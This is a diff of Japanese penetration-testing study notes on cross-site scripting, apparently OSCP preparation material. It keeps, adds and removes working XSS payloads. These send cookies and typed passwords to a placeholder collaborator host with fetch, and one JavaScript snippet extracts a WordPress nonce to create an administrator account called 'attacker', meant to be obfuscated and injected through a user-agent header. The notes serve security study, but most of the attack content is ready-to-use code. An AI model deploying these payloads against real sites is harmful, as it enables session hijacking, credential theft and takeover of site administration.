@@ -273,14 +273,13 @@ body:document.cookie
 
 ### Cookieが `username:token` の形式の場合
 
-`username` の箇所に以下を注入する：
+`username` の箇所に以下を注入する
 ```
 '"><svg/onload=fetch(`//COLLABORATOR_DOMAIN/${encodeURIComponent(document.cookie)}`)>:<session_id>
 ```
-
 - `encodeURIComponent()`：URLの一部としてCookieを送るときに使用する
 
-→ Request to collaboratorを確認する
+- → Request to collaboratorを確認する
 
 ---
 
@@ -298,14 +297,12 @@ body:document.cookie
 ## 手順
 
 1. ソースコードまたはFuzzingでXSSに脆弱なHTTPヘッダ等を特定する （例：Visitorsプラグインの `user-agent` が脆弱であるとする）
-    
+   
 2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャする
-    
+   
 3. nonceを抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成する
-    
 
-**nonce抽出：**
-
+nonce抽出：
 ```js
 var ajaxRequest = new XMLHttpRequest();
 var requestURL = "/wp-admin/user-new.php"; // アクション実行先のURL
@@ -316,8 +313,7 @@ var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
 var nonce = nonceMatch[1];
 ```
 
-**抽出したnonceを使用してアクションを実行：**
-
+抽出したnonceを使用してアクションを実行：
 ```js
 var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
 ajaxRequest = new XMLHttpRequest();
@@ -326,7 +322,7 @@ ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"
 ajaxRequest.send(params);
 ```
 
-4. [JS: CharCodeAt()による難読化](https://claude.ai/Evasion\(OSCP+%E8%A9%A6%E9%A8%93%E7%AF%84%E5%9B%B2%E5%A4%96\)/Web%E6%94%BB%E6%92%83%E3%81%AE%E9%9B%A3%E8%AA%AD%E5%8C%96.md)を適用する
+4. [JavaScript記法の変換](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md#JavaScript記法の変換)を適用する
     
 5. 難読化したスクリプトをBurp SuiteでXSSに脆弱な箇所（`user-agent`など）に埋め込み、ルートディレクトリへGETリクエストを送信する（`<script></script>` で囲む）
     
@@ -577,46 +573,6 @@ ajaxRequest.send(params);
 ![](../../Images/Pasted%20image%2020250320123617.png)
 
 ---
-
-### OAST
-
-###### username & passwordを取得
-
-1. Comment機能の特定パラメタに以下のスクリプトを注入
-```http
-<input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR_DOMAIN',{
-method:'POST',
-mode: 'no-cors',
-body:username.value+':'+this.value
-});">
-```
-2. Request to collaboratorを確認
-
-##### Cookieを取得する
-
-###### Comment機能の場合
-
-1. Comment機能の特定パラメタに以下のスクリプトを注入
-```http
-<script>
-fetch('https://COLLABORATOR_DOMAIN', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
-</script>
-```
-2. Request to collaboratorを確認
-
-###### Cookieがusername:tokenの場合
-
-1. `username`の箇所にスクリプトを注入
-```
-'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
-```
-- `encodeURIComponent()`: URLの一部としてcookieを送るときに使用
-2. Request to collaboratorを確認
 
 ---
 ## Misc
